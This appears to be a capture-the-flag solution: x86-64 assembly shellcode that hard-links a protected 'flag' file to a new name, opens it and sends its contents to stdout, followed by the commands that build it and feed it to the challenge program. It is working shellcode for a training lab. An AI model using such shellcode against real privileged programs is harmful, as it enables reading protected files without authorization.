###shellcode.s
.global _start
_start:
.intel_syntax noprefix

    mov rax, 0x109
    mov rdi, 3
    lea rsi, [rip+flag]
    mov rdx, -100
    lea r10, [rip+newpath]
    mov r8, 0 
    syscall

    mov rax, 0x2
    lea rdi, [rip+newpath]
    mov rsi, 0
    syscall


    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x300
    syscall

    
flag:
    .ascii "flag\0"
newpath:
    .ascii "lv6out\0"


###  solution  =  gcc -nostdlib -static shellcode.s -o shellcode-elf && objcopy --dump-section .text=shellcode-raw shellcode-elf
### /challenge/lv5 / < shellcode-raw
